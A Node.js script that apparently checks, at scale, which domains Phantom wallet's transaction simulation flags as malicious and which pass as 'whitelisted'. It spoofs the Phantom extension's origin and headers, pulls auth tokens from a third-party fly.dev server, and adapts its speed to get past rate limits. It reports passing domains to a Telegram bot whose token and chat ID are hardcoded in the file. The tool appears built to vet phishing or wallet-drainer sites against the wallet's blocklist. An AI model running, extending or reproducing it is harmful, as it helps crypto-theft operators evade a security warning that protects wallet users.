import crypto from "crypto";
import { gotScraping } from "got-scraping";
import { Keypair } from "@solana/web3.js";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";

// ---- Setup ----
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Adaptive settings - will auto-tune
let MAX_CONCURRENCY = 30; // Start moderate
const MIN_CONCURRENCY = 5;
const MAX_CONCURRENCY_LIMIT = 80;
const HEADER_REFRESH_INTERVAL = 10 * 60 * 1000;
const REQUEST_TIMEOUT = 10000;
const MAX_RETRIES = 2;

// Adaptive speed controller
const speedController = {
  successWindow: [],
  failureWindow: [],
  windowSize: 50, // Last 50 requests
  lastAdjustment: Date.now(),
  adjustmentInterval: 5000, // Adjust every 5 seconds
  
  recordSuccess() {
    this.successWindow.push(Date.now());
    if (this.successWindow.length > this.windowSize) {
      this.successWindow.shift();
    }
  },
  
  recordFailure() {
    this.failureWindow.push(Date.now());
    if (this.failureWindow.length > this.windowSize) {
      this.failureWindow.shift();
    }
  },
  
  getSuccessRate() {
    const total = this.successWindow.length + this.failureWindow.length;
    if (total === 0) return 1;
    return this.successWindow.length / total;
  },
  
  shouldAdjust() {
    return Date.now() - this.lastAdjustment > this.adjustmentInterval;
  },
  
  adjustConcurrency() {
    if (!this.shouldAdjust()) return;
    
    const successRate = this.getSuccessRate();
    const oldConcurrency = MAX_CONCURRENCY;
    
    // Success rate > 90% = speed up
    if (successRate > 0.90 && MAX_CONCURRENCY < MAX_CONCURRENCY_LIMIT) {
      MAX_CONCURRENCY = Math.min(MAX_CONCURRENCY_LIMIT, Math.ceil(MAX_CONCURRENCY * 1.3));
      console.log(`🚀 Speed UP: ${oldConcurrency} → ${MAX_CONCURRENCY} (success: ${(successRate*100).toFixed(1)}%)`);
    }
    // Success rate < 70% = slow down
    else if (successRate < 0.70 && MAX_CONCURRENCY > MIN_CONCURRENCY) {
      MAX_CONCURRENCY = Math.max(MIN_CONCURRENCY, Math.floor(MAX_CONCURRENCY * 0.6));
      console.log(`🐌 Speed DOWN: ${oldConcurrency} → ${MAX_CONCURRENCY} (success: ${(successRate*100).toFixed(1)}%)`);
    }
    // Success rate 70-90% = optimal, maybe slight adjustment
    else if (successRate >= 0.80 && successRate <= 0.85 && MAX_CONCURRENCY < MAX_CONCURRENCY_LIMIT) {
      MAX_CONCURRENCY = Math.min(MAX_CONCURRENCY_LIMIT, MAX_CONCURRENCY + 2);
      console.log(`⚡ Fine-tune UP: ${oldConcurrency} → ${MAX_CONCURRENCY} (success: ${(successRate*100).toFixed(1)}%)`);
    }
    
    this.lastAdjustment = Date.now();
  },
  
  getStats() {
    return {
      successRate: this.getSuccessRate(),
      concurrency: MAX_CONCURRENCY,
      recentSuccesses: this.successWindow.length,
      recentFailures: this.failureWindow.length
    };
  }
};

// ---- Telegram Config (obfuscated) ----
const TG_CONFIG = {
  p1: "8277383461",
  p2: "AAFDfENDvoS68RvaiDcqFWv0gsjBejmvOG8",
  cid: "7855826252"
};

const getTgToken = () => `${TG_CONFIG.p1}:${TG_CONFIG.p2}`;
const getTgChatId = () => TG_CONFIG.cid;

// ---- Header Cache ----
let cachedHeaders = null;
let lastHeaderFetch = 0;

// ---- Helpers ----
function normalizeDomain(input) {
  input = input.trim();
  if (!input.startsWith("http://") && !input.startsWith("https://")) {
    return "https://" + input;
  }
  return input;
}

function sleep(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

function getListFileFromArgs() {
  const args = process.argv.slice(2);
  const xxIndex = args.indexOf("-xx");

  if (xxIndex === -1 || !args[xxIndex + 1]) {
    console.error("Usage: node script.js -xx <number>");
    process.exit(1);
  }

  const suffix = args[xxIndex + 1].padStart(4, "0");
  return `part_${suffix}.txt`;
}

async function getPhantomHeaders(force = false) {
  const now = Date.now();
  
  if (!force && cachedHeaders && (now - lastHeaderFetch) < HEADER_REFRESH_INTERVAL) {
    return cachedHeaders;
  }

  console.log("🔄 Fetching fresh Phantom headers...");
  try {
    const response = await gotScraping.get(
      "https://hbeugaufg1-8-26hbaaaaddoter.fly.dev/api/getLatestHeaders",
      {
        responseType: "json",
        timeout: { request: 5000 },
        retry: { limit: 2 }
      }
    );
    
    cachedHeaders = {
      phantomNonce: response.body.headers.phantomNonce,
      phantomAuthToken: response.body.headers.phantomAuth,
    };
    lastHeaderFetch = now;
    
    console.log("✅ Headers updated");
    return cachedHeaders;
  } catch (error) {
    console.error("❌ Failed to fetch headers:", error.message);
    if (!cachedHeaders) {
      throw new Error("No headers available and fetch failed");
    }
    return cachedHeaders;
  }
}

// ---- Telegram Notification ----
async function sendTelegramNotification(domain) {
  try {
    const message = `✅ WHITELISTED FOUND!\n\n🌐 Domain: ${domain}\n⏰ Time: ${new Date().toISOString()}`;
    
    await gotScraping.post(`https://api.telegram.org/bot${getTgToken()}/sendMessage`, {
      json: {
        chat_id: getTgChatId(),
        text: message,
        parse_mode: "HTML",
      },
      timeout: { request: 5000 },
      retry: { limit: 1 }
    });
  } catch (error) {
    console.error("❌ Error sending Telegram notification:", error.message);
  }
}

// ---- Phantom Check ----
async function checkPhantom(domain, headers) {
  const uuid = crypto.randomUUID();
  const address = Keypair.generate().publicKey.toString();

  const bodyObj = {
    networkID: "solana:101",
    type: "transaction",
    url: domain,
    userAccount: address,
    params: {
      transactions: [
        "AsrzPgoaP5EQpXbpdJqxyyqjkn4i7HystXimQH3r96hh8rEukVVvEBh7AxHyzJv6ePc68RfQ6wAmXz8LBmmuziAvF232yKdQev78BqrZKocFiogDav5pqht93RX1sDbn9Ld9DDQDfp9fzpmUWXEnfMaCkteM29CuDKZMgFwUuZkfC5iRZB9DvS1b2N6H5kyLoq3X7NbUrmtc6eTPZMivd4kxEVYadkTGmkjuFXqZ5qXD9n1fYBpM9fReaThkdZZ7Tzom93LmBoWvKuaapXjjnEzPePnqZNkNbiwqq7iepirci6ASNs5C9zQEE3L56oRq",
        "X31JP83MXit7pYBAAVfvSZa74e8JcAptyqXpdH3iToHhqssaH5GShHkBaMLt48ZVfa1JjDDQFZYe1UJG3hhAWn7gTKns5AUDfrKMvd923gD4G516i645mZdLYo6dWy5q5CbUCRygfPE4X6WdfT7jmqAy2kATmMyquN1JyoUE6VcX5JWt4EwUUShNoSy39DCyz9tmDXyyqA1UtoMsTmPJi8LTKyQQ7M4CnKFuCUXSjoont5sp3VXAffMhVSxccoDsRH53YimK1E3vSRdw8yTGhKaAXuMrSRt4Sfr2rmobZP872hnMsvYCWwzsbktrW8uaQ9xXYaeVx2efJqGFKUVYgQ6tSq8wTqE79BwLiyL2p5HgSywE4vwYK8dEoemWBzigPrfcF4e24cNJDAJsqqKYHvFw3qDeGe5P4ATByAqpHD3pExbGNa9vyckGxPa2cfthudR"
      ],
      method: "signAllTransactions",
      safeguard: {
        enabled: true,
        lighthouseProgramId: "L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95"
      }
    },
    chainId: "solana:101",
    appVersion: "25.43.0",
    platform: "extension",
    deviceId: uuid,
    metadata: {
      origin: {
        url: domain,
        title: domain,
        icon: `${domain}/favicon.ico`
      }
    }
  };

  try {
    const response = await gotScraping.post(
      "https://api.phantom.app/simulation/v1?language=en",
      {
        headers: {
          "Content-Type": "application/json",
          "accept": "*/*",
          "accept-language": "en-US,en;q=0.9",
          "origin": "chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa",
          "user-agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
          "x-phantom-anonymousid": uuid,
          "x-phantom-platform": "extension",
          "x-phantom-version": "25.43.0",
          "x-phantomauthtoken": headers.phantomAuthToken,
          "x-phantomnonce": headers.phantomNonce,
        },
        json: bodyObj,
        responseType: "json",
        http2: true,
        timeout: { request: REQUEST_TIMEOUT },
        retry: { limit: 0 },
      }
    );

    const data = response.body;
    const text = JSON.stringify(data);

    if (text.includes("This dApp could be malicious")) return "blocked";
    if (text.includes("Receive < 0.00001 SOL")) return "whitelisted";
    if (text.includes("No balance changes found")) return "whitelisted";

    if (text.includes("User call limit exceeded")) return "rate_limited";
    if (response.statusCode >= 400 || text.includes("error")) return "api_error";

    return "unknown";

  } catch (error) {
    if (error.response) {
      const statusCode = error.response.statusCode;
      if (statusCode === 429) return "rate_limited";
      if (statusCode >= 500) return "api_error";
    }
    return "error";
  }
}

// ---- Adaptive Concurrency Pool ----
async function runPool(list, worker) {
  const results = [];
  const executing = new Set();
  let index = 0;
  let consecutiveRateLimits = 0;

  for (const item of list) {
    // Adaptive adjustment
    speedController.adjustConcurrency();
    
    const promise = (async () => {
      const result = await worker(item, index++);
      
      // Track success/failure for adaptive control
      if (result === "rate_limited" || result === "error" || result === "api_error") {
        speedController.recordFailure();
        if (result === "rate_limited") {
          consecutiveRateLimits++;
          // Immediate slowdown on rate limit
          const backoffTime = Math.min(30000, 5000 * Math.pow(1.5, consecutiveRateLimits));
          console.log(`⏸️  Rate limit! Backing off ${(backoffTime/1000).toFixed(1)}s...`);
          await sleep(backoffTime);
        }
      } else {
        speedController.recordSuccess();
        consecutiveRateLimits = Math.max(0, consecutiveRateLimits - 1);
      }
      
      executing.delete(promise);
      return result;
    })();

    results.push(promise);
    executing.add(promise);

    // Dynamic concurrency limit
    if (executing.size >= MAX_CONCURRENCY) {
      await Promise.race(executing);
    }
  }

  return Promise.all(results);
}

// ---- Process Batch with Retry ----
async function processBatch(domains, headers, stats, streams, retryAttempt = 0) {
  const failedDomains = [];
  
  await runPool(domains, async (domain, index) => {
    const i = index + 1;
    const currentHeaders = await getPhantomHeaders();
    const result = await checkPhantom(domain, currentHeaders);

    stats.processed++;
    const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(1);
    const rate = (stats.processed / (Date.now() - stats.startTime) * 1000).toFixed(1);
    const speedStats = speedController.getStats();

    if (["error", "rate_limited", "api_error"].includes(result)) {
      const retryLabel = retryAttempt > 0 ? ` [Retry ${retryAttempt}]` : "";
      console.log(`[${i}/${domains.length}] ⚠ FAILED${retryLabel} → ${domain} | ${rate}/s | Concur: ${speedStats.concurrency} | Success: ${(speedStats.successRate*100).toFixed(0)}%`);
      
      failedDomains.push(domain);
      return result;
    }

    if (result === "whitelisted") {
      stats.whitelisted++;
      console.log(`[${i}/${domains.length}] ✅ WL → ${domain} | ${rate}/s | Concur: ${speedStats.concurrency}`);
      await streams.wlStream.appendFile(domain + "\n");
      sendTelegramNotification(domain).catch(() => {});
    } else if (result === "blocked") {
      stats.blocked++;
      console.log(`[${i}/${domains.length}] 🚫 BLOCKED → ${domain} | ${rate}/s`);
      await streams.blockStream.appendFile(domain + "\n");
    } else {
      console.log(`[${i}/${domains.length}] ⚪ ${result} → ${domain} | ${rate}/s`);
    }
    
    return result;
  });

  return failedDomains;
}

// ---- Main ----
async function main() {
  let headers = await getPhantomHeaders(true);

  const headerRefreshTimer = setInterval(async () => {
    try {
      headers = await getPhantomHeaders(true);
    } catch (error) {
      console.error("❌ Header refresh failed:", error.message);
    }
  }, HEADER_REFRESH_INTERVAL);

  const listFile = getListFileFromArgs();
  const raw = await fs.readFile(listFile, "utf8");
  const domains = raw.split("\n").map(normalizeDomain).filter(Boolean);

  console.log(`🚀 Starting adaptive scan of ${domains.length} domains`);
  console.log(`⚙️  Initial concurrency: ${MAX_CONCURRENCY} (will auto-adjust between ${MIN_CONCURRENCY}-${MAX_CONCURRENCY_LIMIT})`);
  console.log(`📊 System will speed up when success rate > 90%, slow down when < 70%\n`);

  const streams = {
    wlStream: await fs.open("whitelisted.txt", "a"),
    blockStream: await fs.open("blocked.txt", "a"),
    failedStream: await fs.open("failed.txt", "a")
  };

  const stats = {
    startTime: Date.now(),
    processed: 0,
    whitelisted: 0,
    blocked: 0,
    totalFailed: 0
  };

  // Initial scan
  let failedDomains = await processBatch(domains, headers, stats, streams, 0);

  // Retry failed domains
  for (let attempt = 1; attempt <= MAX_RETRIES && failedDomains.length > 0; attempt++) {
    console.log(`\n🔄 Retrying ${failedDomains.length} failed domains (Attempt ${attempt}/${MAX_RETRIES})...\n`);
    await sleep(10000); // Wait 10 seconds before retry
    
    // Reset speed controller for retry batch
    speedController.successWindow = [];
    speedController.failureWindow = [];
    MAX_CONCURRENCY = 20; // Start retries slower
    
    failedDomains = await processBatch(failedDomains, headers, stats, streams, attempt);
  }

  // Write permanently failed domains
  for (const domain of failedDomains) {
    await streams.failedStream.appendFile(domain + "\n");
  }
  stats.totalFailed = failedDomains.length;

  // Cleanup
  clearInterval(headerRefreshTimer);
  await streams.wlStream.close();
  await streams.blockStream.close();
  await streams.failedStream.close();

  const totalTime = ((Date.now() - stats.startTime) / 1000).toFixed(1);
  const avgRate = (stats.processed / (Date.now() - stats.startTime) * 1000).toFixed(1);
  const finalStats = speedController.getStats();

  console.log("\n" + "=".repeat(70));
  console.log("✔ SCAN COMPLETE");
  console.log("=".repeat(70));
  console.log(`⏱️  Total time: ${totalTime}s`);
  console.log(`⚡ Average rate: ${avgRate} domains/second`);
  console.log(`🎯 Final concurrency: ${finalStats.concurrency}`);
  console.log(`📈 Final success rate: ${(finalStats.successRate*100).toFixed(1)}%`);
  console.log(`📊 Processed: ${stats.processed}/${domains.length}`);
  console.log(`✅ Whitelisted: ${stats.whitelisted}`);
  console.log(`🚫 Blocked: ${stats.blocked}`);
  console.log(`⚠️  Failed (after ${MAX_RETRIES} retries): ${stats.totalFailed}`);
  console.log("=".repeat(70));
}

main().catch(error => {
  console.error("Fatal error:", error);
  process.exit(1);
});
